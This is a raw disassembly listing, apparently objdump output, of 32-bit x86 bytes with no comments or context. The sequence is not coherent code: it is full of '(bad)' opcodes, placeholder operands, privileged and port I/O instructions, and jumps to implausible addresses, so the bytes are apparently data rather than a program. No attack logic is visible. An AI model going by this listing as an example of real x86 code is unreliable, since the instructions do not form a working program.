  4171aa:	test   bh,bh
  4171ac:	jne    0x417210
  4171ae:	xchg   BYTE PTR [esi+0x31be449a],ah
  4171b4:	mov    edx,0xd58d3a8f
  4171b9:	adc    al,0xa9
  4171bb:	fabs   
  4171bd:	gs jo  0x417165
  4171c0:	jb     0x417142
  4171c2:	lods   al,BYTE PTR ds:[esi]
  4171c3:	fs dec ecx
  4171c5:	sbb    dh,BYTE PTR gs:[ebx-0x6bbcf30d]
  4171cc:	pop    es
  4171cd:	sub    eax,0xbe0fd17a
  4171d2:	repnz ds cld 
  4171d5:	fmul   QWORD PTR ss:[edi]
  4171d8:	fimul  WORD PTR [eax+0x32]
  4171db:	pushf  
  4171dc:	inc    edi
  4171dd:	jmp    0x9c7c394a
  4171e2:	dec    ecx
  4171e3:	cli    
  4171e4:	mov    al,ds:0x37065a50
  4171e9:	pop    ds
  4171ea:	mov    BYTE PTR [ecx],cl
  4171ec:	sbb    esp,DWORD PTR [ebx+0x1a]
  4171ef:	mov    esp,0xf6e0a127
  4171f4:	lds    ebp,FWORD PTR [esi]
  4171f6:	mov    al,ds:0xc7b52178
  4171fb:	test   BYTE PTR [ebp+0x71],dh
  4171fe:	and    BYTE PTR [ebp-0x314a236a],ch
  417204:	inc    esi
  417205:	in     eax,0xa5
  417207:	jnp    0x41723b
  417209:	enter  0x83c9,0x9
  41720d:	xor    BYTE PTR [eax],cl
  41720f:	stos   BYTE PTR es:[edi],al
  417210:	lahf   
  417211:	push   es
  417212:	aam    0xbd
  417214:	sbb    bl,dl
  417216:	das    
  417217:	scas   al,BYTE PTR es:[edi]
  417218:	daa    
  417219:	cdq    
  41721a:	cwde   
  41721b:	(bad)  
  41721d:	inc    esi
  41721e:	pusha  
  41721f:	daa    
  417220:	xchg   esp,eax
  417221:	stos   DWORD PTR es:[edi],eax
  417222:	jb     0x41727f
  417224:	cld    
  417225:	pop    ds
  417226:	stos   BYTE PTR es:[edi],al
  417227:	jnp    0x4171ca
  417229:	cmp    edi,eax
  41722b:	adc    bh,BYTE PTR [eax-0x43]
  41722e:	daa    
  41722f:	pop    edi
  417230:	mov    WORD PTR [eax+0x4a],?
  417233:	or     al,0x6f
  417235:	icebp  
  417236:	mov    eax,0xf06944f4
  41723b:	cdq    
  41723c:	or     ecx,0x924aee94
  417242:	sub    edx,DWORD PTR [ecx]
  417244:	push   ebp
  417245:	jmp    0x2bba4a3f
  41724a:	loope  0x417246
  41724c:	loop   0x4171fc
  41724e:	add    al,0xce
  417250:	iret   
  417251:	test   eax,0x4d05683e
  417256:	dec    ebx
  417257:	out    0xfb,eax
  417259:	cmp    ah,BYTE PTR [edx+0x38]
  41725c:	test   BYTE PTR [eax+eiz*1+0x544bee9e],dl
  417263:	or     al,0x8a
  417265:	lahf   
  417266:	call   0xd2b3bbdd
  41726b:	xchg   edx,eax
  41726c:	xchg   ebp,eax
  41726d:	pop    ebx
  41726e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726f:	or     BYTE PTR [ecx+0x2d],dh
  417272:	sbb    eax,0xd627b8d5
  417277:	mov    ebp,0x742e099b
  41727c:	mov    edi,0x30bc8880
  417281:	or     eax,0x76946985
  417286:	popa   
  417287:	(bad)  
  417288:	mov    eax,ds:0xf2cfcbf9
  41728d:	pop    eax
  41728e:	es jl  0x41730d
  417291:	xchg   ecx,eax
  417292:	ja     0x4172a9
  417294:	rcr    BYTE PTR [ebp+eax*4-0x1d],0xf4
  417299:	jmp    0xc2c5:0x9e4e30bd
  4172a0:	int3   
  4172a1:	mov    ds:0x38c65f5a,al
  4172a6:	or     eax,0x901c9bd6
  4172ab:	adc    DWORD PTR [ecx+0xa],ecx
  4172ae:	popa   
  4172af:	ret    0x83d6
  4172b2:	test   al,0x52
  4172b4:	lahf   
  4172b5:	cmp    eax,0xef786abf
  4172ba:	out    dx,al
  4172bb:	or     al,BYTE PTR [ecx+0x7b]
  4172be:	aas    
  4172bf:	mov    esi,0xb328573f
  4172c4:	push   cs
  4172c5:	add    ecx,DWORD PTR [ecx+0x30]
  4172c8:	inc    ebx
  4172c9:	add    BYTE PTR [eax+0x78],bh
  4172cc:	in     eax,dx
  4172cd:	cwde   
  4172ce:	adc    BYTE PTR [esi],cl
  4172d0:	enter  0x682f,0x7f
  4172d4:	in     al,dx
  4172d5:	xchg   edi,eax
  4172d6:	iret   
  4172d7:	rol    DWORD PTR [ebx+0x3a],0x91
  4172db:	dec    esp
  4172dc:	imul   esp,DWORD PTR [ebp-0x61],0x7e
  4172e0:	popf   
  4172e1:	and    edi,0xc622a702
  4172e7:	mov    ds:0x10eba89a,eax
  4172ec:	cmp    DWORD PTR [esi],eax
  4172ee:	cmp    edi,esi
  4172f0:	fild   QWORD PTR [esi]
  4172f2:	sti    
  4172f3:	jg     0x4172a4
  4172f5:	iret   
  4172f6:	pop    ecx
  4172f7:	in     al,dx
  4172f8:	leave  
  4172f9:	mov    ah,0x1c
  4172fb:	dec    ecx
  4172fc:	stos   DWORD PTR es:[edi],eax
  4172fd:	dec    ecx
  4172fe:	loop   0x4172b5
  417300:	xchg   ecx,eax
  417301:	leave  
  417302:	int    0xd7
  417304:	addr16 ret 0xbb4d
  417308:	push   0x73f579d4
  41730d:	jecxz  0x417305
  41730f:	out    dx,al
  417310:	xchg   BYTE PTR [eax-0x3b],al
  417313:	cmp    esi,ecx
  417315:	imul   ebx,DWORD PTR [edi+0x478d3b65],0x11
  41731c:	push   ebp
  41731d:	dec    eax
  41731e:	pusha  
  41731f:	icebp  
  417320:	and    dh,BYTE PTR [eax+0xb]
  417323:	inc    ebx
  417324:	jmp    0x86bd24ba
  417329:	cmc    
  41732a:	fs push 0xa6b1885e
  417330:	aas    
  417331:	push   cs
  417332:	pop    ebp
  417333:	add    DWORD PTR [ebx*1+0x651d3f92],ebp
  41733a:	in     eax,dx
  41733b:	cmp    eax,DWORD PTR ds:0x9f2a6e2d
  417341:	xlat   BYTE PTR ds:[ebx]
  417342:	push   ebx
  417343:	ins    BYTE PTR es:[edi],dx
  417344:	sahf   
  417345:	or     eax,0xf34c3d72
  41734a:	repnz int 0xee
  41734d:	iret   
  41734e:	pusha  
  41734f:	and    ebp,DWORD PTR [esi]
  417351:	ins    DWORD PTR es:[edi],dx
  417352:	ds stos DWORD PTR es:[edi],eax
  417354:	and    ch,BYTE PTR [ebx+0x140c0206]
  41735a:	pop    esi
  41735b:	pcmpgtd mm2,QWORD PTR [edx]
  41735e:	inc    edx
  41735f:	loop   0x41733f
  417361:	push   edx
  417362:	xor    esp,DWORD PTR [ebx]
  417364:	ins    DWORD PTR es:[edi],dx
  417365:	or     DWORD PTR [edi-0xc],ebp
  417368:	aam    0x9c
  41736a:	and    ebx,DWORD PTR [edx*2-0x3676886e]
  417371:	lock mov BYTE PTR [eax-0x57],ch
  417375:	adc    DWORD PTR [edi-0x2396f594],0x75
  41737c:	inc    ebp
  41737d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41737e:	retf   0xd8fd
  417381:	ret    0xeffe
  417384:	or     DWORD PTR ds:0xb8da26c9,eax
  41738a:	pusha  
  41738b:	jmp    0x41730e
  41738d:	mov    ah,0x46
  41738f:	ret    
  417390:	xor    eax,0x69f92793
  417395:	scas   al,BYTE PTR es:[edi]
  417396:	mov    ds:0xbd2e4e49,eax
  41739b:	adc    esi,DWORD PTR [esi+eiz*4+0x7c]
  41739f:	and    al,0x6a
  4173a1:	test   DWORD PTR [edi+edx*1+0x77],ebx
  4173a5:	mov    cl,0x43
  4173a7:	(bad)  
  4173a9:	cmp    al,0x8e
  4173ab:	pop    esp
  4173ac:	jns    0x4173e4
  4173ae:	or     DWORD PTR [edx-0x4f],ebx
  4173b1:	ror    BYTE PTR [ebp+0x5c],1
  4173b4:	loope  0x4173c1
  4173b6:	loop   0x4173eb
  4173b8:	inc    esp
  4173b9:	(bad)  
  4173ba:	mul    BYTE PTR [edx+0x2f]
  4173bd:	scas   al,BYTE PTR es:[edi]
  4173be:	aad    0x2f
  4173c0:	fdiv   QWORD PTR [eax+0x396e3be8]
  4173c6:	repnz mov edx,0xca2500de
  4173cc:	data16 cmp al,0x54
  4173cf:	or     BYTE PTR [edx],ch
  4173d1:	nop
  4173d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173d3:	jbe    0x4173f7
  4173d5:	push   ebx
  4173d6:	aaa    
  4173d7:	repz mov bl,0xbb
  4173da:	or     bh,BYTE PTR [edi+0x6]
  4173dd:	lods   al,BYTE PTR ds:[esi]
  4173de:	add    eax,0x59063557
  4173e3:	std    
  4173e4:	jbe    0x4173bf
  4173e6:	push   si
  4173e8:	pop    ebp
  4173e9:	push   es
  4173ea:	sbb    DWORD PTR ds:0x13c1ac62,esi
  4173f0:	loopne 0x417454
  4173f2:	aas    
  4173f3:	adc    eax,0xff211994
  4173f8:	dec    eax
  4173f9:	inc    edi
  4173fb:	ins    DWORD PTR es:[edi],dx
  4173fc:	ja     0x4173bc
  4173fe:	or     cl,dl
  417400:	cwde   
  417401:	hlt    
  417402:	add    eax,0xf4d60ce0
  417407:	loopne 0x4173a2
  417409:	ficom  WORD PTR [esi]
  41740b:	mov    bl,0x9f
  41740d:	jno    0x4173ba
  41740f:	addr16 push cs
  417411:	call   0x5b90:0x948c0d31
  417418:	int    0xbd
  41741a:	shl    BYTE PTR [eax+0x1fb0bd95],1
  417420:	xchg   ecx,eax
  417421:	pop    esp
  417422:	neg    DWORD PTR [esi]
  417424:	pop    esp
  417425:	xor    DWORD PTR [ebx],edx
  417427:	mov    bh,0xbe
  417429:	das    
  41742a:	xor    eax,0xd63150f8
  41742f:	cmp    BYTE PTR [edi],ch
  417431:	bound  ecx,QWORD PTR [edi-0x10]
  417434:	or     DWORD PTR [esp+ecx*1+0x68c66b0f],0x49
  41743c:	dec    eax
  41743d:	popf   
  41743e:	push   esp
  41743f:	je     0x417473
  417441:	mov    ah,0x2d
  417443:	push   eax
  417444:	and    BYTE PTR [edx],dl
  417446:	inc    ebx
  417447:	retf   0x29ed
  41744a:	sub    eax,0xc773aafc
  41744f:	stc    
  417450:	and    DWORD PTR [edi+0x6bccc1f6],ebx
  417456:	add    eax,0x24c9b8e8
  41745b:	rcl    DWORD PTR [eax],0x46
  41745e:	jbe    0x41742c
  417460:	adc    DWORD PTR [ebx+0x61],esi
  417463:	(bad)  
  417464:	adc    eax,0x27dd63ac
  417469:	daa    
  41746a:	jb     0x417406
  41746c:	mov    cl,0x31
  41746e:	loope  0x41746d
  417470:	mov    ch,0x41
  417472:	or     esp,DWORD PTR [edx+0x5a]
  417475:	xor    edx,DWORD PTR [eax+edi*8-0x3db4f4f3]
  41747c:	mov    bl,0x17
  41747e:	lods   al,BYTE PTR ds:[esi]
  41747f:	(bad)  
  417480:	inc    edi
  417481:	cld    
  417482:	push   edi
  417483:	sbb    cl,dl
  417485:	(bad)  
  417486:	mov    bl,0x34
  417488:	pushf  
  417489:	test   BYTE PTR [edi+0x416cb8b2],0x2f
  417490:	pop    ebp
  417491:	pop    esi
  417492:	cwde   
  417493:	cmc    
  417494:	aas    
  417495:	rcr    esi,0x6c
  417498:	jns    0x41742d
  41749a:	cmp    al,0xb
  41749c:	mov    ah,0x57
  41749e:	(bad)  [ecx+edx*2]
  4174a1:	test   al,0xde
  4174a3:	and    BYTE PTR fs:0x65c44302,ch
  4174aa:	stc    
  4174ab:	push   ecx
  4174ac:	mov    cl,0xd7
  4174ae:	mov    esi,0xa69a7e9e
  4174b3:	test   DWORD PTR [edi+0x6082dedc],ebp
  4174b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ba:	and    BYTE PTR [edx+edx*2+0x55],al
  4174be:	cwde   
  4174bf:	xchg   edx,eax
  4174c0:	ins    DWORD PTR es:[edi],dx
  4174c1:	daa    
  4174c2:	ret    
  4174c3:	pusha  
  4174c4:	push   edx
  4174c5:	dec    edx
  4174c6:	fwait
  4174c7:	mov    WORD PTR [edx],?
  4174c9:	test   eax,0x4d874fd1
  4174ce:	or     DWORD PTR [ecx-0x25],esp
  4174d1:	dec    ecx
  4174d2:	pop    esi
  4174d3:	push   edi
  4174d4:	or     DWORD PTR [edx-0x549f3128],ecx
  4174da:	stc    
  4174db:	jo     0x4174ff
  4174dd:	scas   al,BYTE PTR es:[edi]
  4174de:	mov    gs,ecx
  4174e0:	shl    BYTE PTR [esi],1
  4174e2:	inc    eax
  4174e3:	push   0x10840fe7
  4174e8:	jl     0x4174db
  4174ea:	xchg   DWORD PTR [eax+edx*4+0x333a1709],eax
  4174f1:	xchg   ebx,eax
  4174f2:	(bad)  
  4174f4:	std    
  4174f5:	mov    al,0x1f
  4174f7:	jno    0x417550
  4174f9:	leave  
  4174fa:	push   ss
  4174fb:	lods   eax,DWORD PTR ds:[esi]
  4174fc:	jno    0x4174a0
  4174fe:	test   BYTE PTR [ecx+ecx*8+0x1b],bl
  417502:	in     al,0x40
  417504:	pusha  
  417505:	repnz cdq 
  417507:	ja     0x417548
  417509:	mov    ?,WORD PTR ds:0x663ae58f
  41750f:	popa   
  417510:	in     eax,0xe1
  417512:	push   esp
  417513:	test   al,0x9b
  417515:	(bad)  
  417516:	repz or bh,cl
  417519:	js     0x4174a6
  41751b:	ficomp WORD PTR [esi-0x21ba6b27]
  417521:	mov    dh,0x6e
  417523:	mov    ebx,0x5b5c5bce
  417528:	into   
  417529:	ror    BYTE PTR ds:[edi],1
  41752c:	xor    ebx,DWORD PTR [ecx+edx*2-0x3580b0]
  417533:	das    
  417534:	nop
  417535:	dec    ecx
  417536:	(bad)  
  417537:	stc    
  417538:	std    
  417539:	push   ebp
  41753a:	add    BYTE PTR [eax+esi*4+0x54841dd8],bh
  417541:	xchg   ebp,eax
  417542:	jae    0x4174fd
  417544:	into   
  417545:	dec    ebx
  417546:	test   eax,0xbb2e83d5
  41754b:	daa    
  41754c:	in     al,dx
  41754d:	sub    DWORD PTR [esi+0x7b],edx
  417550:	sbb    esi,esp
  417552:	popf   
  417553:	lock push edi
  417555:	pushw  ss
  417557:	fidiv  WORD PTR [ecx]
  417559:	mov    bh,0x4
  41755b:	cmp    DWORD PTR [edi-0x38b40f5c],0x18
  417562:	or     BYTE PTR [ecx-0x56822b52],dl
  417568:	mov    bh,0xba
  41756a:	sbb    ah,BYTE PTR [edi-0x2d]
  41756d:	test   eax,0x893d215e
  417572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417573:	outs   dx,DWORD PTR ds:[esi]
  417574:	popf   
  417575:	sbb    ebx,DWORD PTR [ecx+ecx*4-0x67813fc7]
  41757c:	bound  esi,QWORD PTR [ecx+0x7bd17798]
  417582:	call   0xc657:0x5118483
  417589:	out    0x73,eax
  41758b:	push   ss
  41758c:	xor    al,0x89
  41758e:	cld    
  41758f:	loopne 0x417600
  417591:	xchg   edx,eax
  417592:	xor    eax,0x3b1e247d
  417597:	add    BYTE PTR [ebx-0x7150d371],al
  41759d:	push   0x60a711ef
  4175a2:	jo     0x4175c7
  4175a4:	fiadd  DWORD PTR [esi]
  4175a6:	push   edx
  4175a7:	cmp    al,0x31
  4175a9:	sub    ebp,DWORD PTR [ebx-0x2f]
  4175ac:	jo     0x41758d
  4175ae:	mov    ebx,0xc61ff041
  4175b3:	hlt    
  4175b4:	cmp    ebx,esp
  4175b6:	out    dx,eax
  4175b7:	outs   dx,DWORD PTR ds:[esi]
  4175b8:	xchg   ebp,eax
  4175b9:	sub    eax,0xc1570671
  4175be:	outs   dx,DWORD PTR ds:[esi]
  4175bf:	aad    0xf4
  4175c1:	cmp    dl,ch
  4175c3:	adc    BYTE PTR [ecx+0x6eee0d4b],ch
  4175c9:	xchg   ebp,eax
  4175ca:	in     al,0x87
  4175cc:	jecxz  0x4175b2
  4175ce:	push   edx
  4175cf:	or     al,0x1f
  4175d1:	cmp    al,0xb5
  4175d3:	cmp    BYTE PTR [eax],dh
  4175d5:	cld    
  4175d6:	or     edi,esp
  4175d8:	ins    BYTE PTR es:[edi],dx
  4175d9:	mov    bh,0x9a
  4175db:	or     eax,0xc9823524
  4175e0:	sbb    DWORD PTR [esi-0x80],0xffffffcf
  4175e4:	dec    esp
  4175e5:	arpl   WORD PTR [ebx-0x5b],cx
  4175e8:	push   0xc6db4a56
  4175ed:	cmp    DWORD PTR [eax+0x6fda90a9],0xffffffe3
  4175f4:	xor    ah,BYTE PTR [eax-0x454d0162]
  4175fa:	mov    dl,0x65
  4175fc:	mov    dl,0x77
  4175fe:	shufps xmm1,XMMWORD PTR [ecx],0xeb
  417602:	enter  0xed6c,0x35
  417606:	fadd   QWORD PTR [eax]
  417608:	stos   DWORD PTR es:[edi],eax
  417609:	or     al,BYTE PTR [edi+0x2]
  41760c:	dec    esp
  41760d:	inc    edx
  41760e:	popf   
  41760f:	cdq    
  417610:	lods   eax,DWORD PTR ds:[esi]
  417611:	push   ebp
  417612:	mov    cl,0xee
  417614:	fdivr  st,st(5)
  417616:	or     edx,DWORD PTR [ebx-0x3b]
  417619:	and    DWORD PTR [ebx-0x10],esi
  41761c:	or     eax,0xe07517d1
  417621:	pusha  
  417622:	push   ds
  417623:	fdiv   QWORD PTR [ebp+0x5c]
  417626:	scas   al,BYTE PTR es:[edi]
  417627:	fisub  WORD PTR [ecx+ebp*2]
  41762a:	jg     0x417617
  41762c:	imul   ecx,DWORD PTR [esi-0xd71b9f7],0x6e99a53b
  417636:	fs xchg ecx,eax
  417638:	sar    ecx,cl
  41763a:	inc    edx
  41763b:	add    eax,0x81bd8f40
  417640:	sub    DWORD PTR [esi],edi
  417642:	or     BYTE PTR [edi+edx*1-0x15],bh
  417646:	add    ebx,eax
  417648:	popf   
  417649:	mov    edx,0xdfa8cd0
  41764e:	dec    BYTE PTR [ebx+0x7e]
  417651:	hlt    
  417652:	xchg   edi,eax
  417653:	pop    ebp
  417654:	sbb    BYTE PTR [edx+0x4a],ch
  417657:	push   cs
  417658:	xchg   edi,eax
  417659:	outs   dx,BYTE PTR ds:[esi]
  41765a:	scas   eax,DWORD PTR es:[edi]
  41765b:	dec    edi
  41765c:	dec    esi
  41765d:	adc    DWORD PTR [ecx+0x20],0xd6635b4b
  417664:	mov    BYTE PTR [eax-0x3633c503],cl
  41766a:	sub    bh,dl
  41766c:	push   0xdc759879
  417671:	add    BYTE PTR [ebx+ebx*8+0xffde33d],0x70
  417679:	or     bh,dh
  41767b:	or     DWORD PTR [edi],ecx
  41767d:	(bad)  
  41767e:	mov    bl,0x6c
  417680:	sbb    eax,0x9dcbf4d8
  417685:	mov    esp,0x91fcad38
  41768a:	lods   eax,DWORD PTR ds:[esi]
  41768b:	mov    gs,WORD PTR [eax+eiz*1]
  41768e:	mov    BYTE PTR [esi+edi*1+0x41],ah
  417692:	push   0xffffff84
  417694:	pop    esi
  417695:	ins    BYTE PTR es:[edi],dx
  417696:	std    
  417697:	sbb    al,0x2a
  417699:	dec    esp
  41769a:	loopne 0x417648
  41769c:	ret    0x605a
  41769f:	out    0x44,al
  4176a1:	adc    DWORD PTR [edx+0x17257752],0x45
  4176a8:	mov    cl,0x83
  4176aa:	ja     0x4176af
  4176ac:	cmp    ah,cl
  4176ae:	wrmsr  
  4176b0:	cmp    ebx,DWORD PTR [edx]
  4176b2:	test   eax,0xda45ae1a
  4176b7:	mov    ebx,0xe7981e5f
  4176bc:	cmp    BYTE PTR [esi+0x596610ad],dl
  4176c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176c3:	dec    edx
  4176c4:	push   ebx
  4176c5:	xchg   ecx,eax
  4176c6:	shl    DWORD PTR [ecx],0xba
  4176c9:	sbb    ch,bh
  4176cb:	push   ecx
  4176cc:	mov    bl,0x69
  4176ce:	ret    0xa28a
  4176d1:	out    dx,al
  4176d2:	xor    BYTE PTR [ebx],dl
  4176d4:	jl     0x4176bf
  4176d6:	push   edi
  4176d7:	push   edi
  4176d8:	inc    edi
  4176d9:	or     bh,cl
  4176db:	(bad)  
  4176dc:	or     al,ch
  4176de:	pushf  
  4176df:	jge    0x4176b5
  4176e1:	dec    ebx
  4176e2:	mov    ds:0x8188d76d,eax
  4176e7:	xchg   BYTE PTR [edi+0xcd5f558],bl
  4176ed:	pop    ebx
  4176ee:	out    0xd4,eax
  4176f0:	sbb    bh,BYTE PTR [ecx-0x2]
  4176f3:	daa    
  4176f4:	jae    0x41773e
  4176f6:	sbb    edx,esi
  4176f8:	xchg   esp,eax
  4176f9:	jnp    0x4176d5
  4176fb:	add    eax,0x3f1a14d8
  417700:	ret    0xd1b3
  417703:	pop    edi
  417704:	mov    bh,0x50
  417706:	aaa    
  417707:	test   eax,0xa46e6573
  41770c:	(bad)  
  41770d:	loope  0x41774e
  41770f:	xchg   ebp,eax
  417710:	adc    dl,BYTE PTR [edi]
  417712:	js     0x417767
  417714:	jo     0x4176c7
  417716:	into   
  417717:	(bad)  
  417718:	out    dx,eax
  417719:	not    DWORD PTR [eax-0x645a4e6f]
  41771f:	mov    cl,0xd7
  417721:	int    0xd1
  417723:	mov    BYTE PTR [edi-0x6bc6bd4],dl
  417729:	nop
  41772a:	mov    ds:0x4d2e57d2,al
  41772f:	add    al,BYTE PTR [edi-0x2a]
  417732:	mov    ebx,0x9b9c5761
  417737:	sbb    BYTE PTR [edx-0x3],dh
  41773a:	push   eax
  41773b:	retf   
  41773c:	repz (bad) 
  41773f:	mov    esi,0xbf990ea1
  417744:	cmp    BYTE PTR [ebp+0x41],al
  417747:	mov    ecx,0x7a5eda65
  41774c:	fcomp  DWORD PTR [esi+0xc]
  41774f:	aaa    
  417750:	push   edx
  417751:	stos   DWORD PTR es:[edi],eax
  417752:	push   ecx
  417753:	jl     0x41770c
  417755:	mov    bl,0xff
  417757:	add    eax,0x285ac92d
  41775c:	or     BYTE PTR [ecx+0x13],bh
  41775f:	xchg   ebx,eax
  417760:	push   edx
  417761:	sar    BYTE PTR [edi],cl
  417763:	(bad)  [edx+0x38]
  417766:	dec    eax
  417767:	sub    DWORD PTR [esp+ebp*2+0x8],esp
  41776b:	test   eax,0x313da951
  417770:	mov    edx,0xcf38a68c
  417775:	xchg   BYTE PTR [ecx+0x20],bh
  417778:	repz mov ebp,0x8b846126
  41777e:	push   0xe6d07743
  417783:	sahf   
  417784:	adc    DWORD PTR [esi-0x48953fbd],esp
  41778a:	clc    
  41778b:	sub    eax,0x2e4f528c
  417790:	(bad)  
  417791:	std    
  417792:	jge    0x417723
  417794:	lahf   
  417795:	push   eax
  417796:	pop    edx
  417797:	mov    dl,0x30
  417799:	into   
  41779a:	add    BYTE PTR [ebx+0x43],dh
  41779d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41779e:	push   edx
  41779f:	lock mov eax,ds:0x5f11425b
  4177a5:	and    dl,BYTE PTR [bx+di]
  4177a8:	cmp    ch,0x90
  4177ab:	in     eax,dx
  4177ac:	aas    
  4177ad:	mov    bl,0x0
  4177af:	ja     0x41780e
  4177b1:	(bad)  
  4177b3:	jae    0x41778a
  4177b5:	sti    
  4177b6:	add    BYTE PTR [edx+ebx*4-0xd],bl
  4177ba:	test   al,0x8b
  4177bc:	cmp    eax,0xa0013f60
  4177c1:	dec    ebp
  4177c2:	in     eax,0xf1
  4177c4:	lahf   
  4177c5:	ja     0x41780e
  4177c7:	adc    edx,ecx
  4177c9:	push   ebp
  4177ca:	(bad)  
  4177cb:	cmp    esp,DWORD PTR [edx+0x65]
  4177ce:	jno    0x417807
  4177d0:	mov    dh,0xbb
  4177d2:	inc    edx
  4177d3:	inc    ebx
  4177d4:	test   BYTE PTR [ebx+0x4d],0x72
  4177d8:	fbstp  TBYTE PTR [esi+ebp*4]
  4177db:	lods   al,BYTE PTR ds:[esi]
  4177dc:	stos   DWORD PTR es:[edi],eax
  4177dd:	test   al,0x1a
  4177df:	std    
  4177e0:	(bad)  
  4177e1:	in     eax,0x1
  4177e3:	or     eax,0x738bf599
  4177e8:	popa   
  4177e9:	ins    DWORD PTR es:[edi],dx
  4177ea:	jo     0x417851
  4177ec:	cmp    ecx,edi
  4177ee:	shr    DWORD PTR [ecx-0x50],0x72
  4177f2:	xchg   ebx,eax
  4177f3:	test   DWORD PTR [ebx-0x2b2875eb],esi
  4177f9:	jp     0x41784a
  4177fb:	pop    ecx
  4177fc:	aam    0x98
  4177fe:	int3   
  4177ff:	aas    
  417800:	dec    eax
  417801:	push   es
  417802:	inc    ecx
  417803:	xchg   BYTE PTR [esi],al
  417805:	imul   ebx,DWORD PTR [ecx+0x4],0x73
  417809:	sbb    BYTE PTR [esp+eax*4-0x1a0de69],dh
  417810:	out    dx,eax
  417811:	pop    edx
  417812:	push   esp
  417813:	pushf  
  417814:	or     DWORD PTR [edi-0x73],ecx
  417817:	outs   dx,BYTE PTR ds:[esi]
  417818:	mov    ebp,DWORD PTR [edx]
  41781a:	push   eax
  41781b:	xchg   DWORD PTR [esi],edi
  41781d:	fisttp DWORD PTR [edx+0x2d]
  417820:	mov    bl,0x38
  417822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417823:	pop    es
  417824:	dec    ebp
  417825:	daa    
  417826:	add    ebx,DWORD PTR [esi+0x56]
  417829:	xor    al,bl
  41782b:	xchg   ecx,eax
  41782c:	in     al,0xf3
  41782e:	iret   
  41782f:	sub    cl,BYTE PTR [ebx]
  417831:	xchg   esp,eax
  417832:	inc    esp
  417833:	mov    dl,0x86
  417835:	or     al,0xfe
  417837:	sub    cl,BYTE PTR [esi+0x5f952756]
  41783d:	cmp    edx,ebp
  41783f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417840:	jecxz  0x417859
  417842:	mov    edi,0xc42bf20b
  417847:	sbb    eax,0x6bd8afa9
  41784c:	loope  0x4178b1
  41784e:	js     0x417871
  417850:	ins    DWORD PTR es:[edi],dx
  417851:	pop    ebx
  417852:	adc    bl,BYTE PTR [ebp+0x48]
  417855:	inc    esp
  417856:	popf   
  417857:	cmp    al,0x9f
  417859:	rep lods eax,DWORD PTR ds:[esi]
  41785b:	cli    
  41785c:	bound  edx,QWORD PTR [edi+0x32111845]
  417862:	mov    ah,0x53
  417864:	lock in eax,0x2b
  417867:	pop    edx
  417868:	dec    eax
  417869:	das    
  41786a:	jmp    0x4178b2
  41786c:	iret   
  41786d:	mov    WORD PTR [ebx-0x20],cs
  417870:	xchg   esi,eax
  417871:	jae    0x4178e1
  417873:	jne    0x417809
  417875:	xor    eax,0x967f736b
  41787a:	les    esi,FWORD PTR [ebx-0x42f07471]
  417880:	ret    
  417881:	jnp    0x4178f4
  417883:	pop    ebx
  417884:	leave  
  417885:	in     eax,0x5f
  417887:	adc    edx,DWORD PTR ds:0x6566b5dc
  41788d:	call   0xe74efacc
  417892:	addr16 mov eax,ds:0x681
  417896:	sub    eax,0x31ab752f
  41789b:	fcomip st,st(7)
  41789d:	cmp    ecx,DWORD PTR [esi+0x969b1fc]
  4178a3:	les    eax,FWORD PTR [ecx+0x42091b1]
  4178a9:	int3   
  4178aa:	jmp    0x50446450
  4178af:	adc    ch,BYTE PTR [edi+0x719f9196]
  4178b5:	cmp    DWORD PTR [ebx-0x18a770ef],ebx
  4178bb:	and    eax,0xe0006e8b
  4178c0:	push   esi
  4178c1:	fisub  WORD PTR ds:0xd47c5424
  4178c7:	(bad)  
  4178c8:	outs   dx,DWORD PTR ds:[esi]
  4178c9:	cmp    dl,BYTE PTR [edi]
  4178cb:	popa   
  4178cc:	push   esp
  4178cd:	xchg   ebp,eax
  4178ce:	or     eax,0x3f6f09e2
  4178d3:	and    bh,BYTE PTR [edi+0x321c313a]
  4178d9:	xor    ebx,esi
  4178db:	inc    edx
  4178dc:	lock push 0x66666cd4
  4178e2:	(bad)  
  4178e3:	cld    
  4178e4:	in     al,0x49
  4178e6:	in     eax,0x4c
  4178e8:	sbb    eax,0xaa63cead
  4178ed:	jne    0x417905
  4178ef:	push   ebp
  4178f0:	inc    ebp
  4178f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178f2:	mov    dl,0xfb
  4178f4:	inc    ecx
  4178f5:	js     0x41795a
  4178f7:	arpl   WORD PTR [eax+0x3c],sp
  4178fa:	sar    DWORD PTR ds:0x12a8142c,0xaa
  417901:	jne    0x41789b
  417903:	adc    DWORD PTR [esi],edi
  417905:	push   esi
  417906:	cmc    
  417907:	lods   al,BYTE PTR ds:[esi]
  417908:	clc    
  417909:	fistp  DWORD PTR [eax-0x4ae22afd]
  41790f:	and    al,bh
  417911:	(bad)  
  417912:	xor    BYTE PTR [eax+0x5a],ah
  417915:	clc    
  417916:	jnp    0x417966
  417918:	shl    BYTE PTR [ecx+0x77],cl
  41791b:	(bad)  
  41791c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41791d:	jbe    0x41797f
  41791f:	xlat   BYTE PTR ds:[ebx]
  417920:	mov    ecx,0x6dbe1ce6
  417925:	fcom   QWORD PTR [ecx-0x57]
  417928:	test   ah,dl
  41792a:	inc    esp
  41792b:	addr16 imul esi,ebx,0x1d02d0e2
  417932:	push   ebp
  417933:	sbb    BYTE PTR [edx+0x5e0f3d4c],cl
  417939:	dec    esp
  41793a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41793b:	jmp    0x9c45:0x988b08d8
  417942:	scas   eax,DWORD PTR es:[edi]
  417943:	cmp    ah,BYTE PTR [bx+si-0x74]
  417947:	icebp  
  417948:	sbb    DWORD PTR [edx-0x3d],ecx
  41794b:	cdq    
  41794c:	xchg   DWORD PTR [ebp-0x41],esp
  41794f:	sub    eax,DWORD PTR [ebx]
  417951:	shr    BYTE PTR [edi],0x66
  417954:	loop   0x4178f4
  417956:	mov    dl,BYTE PTR [eax]
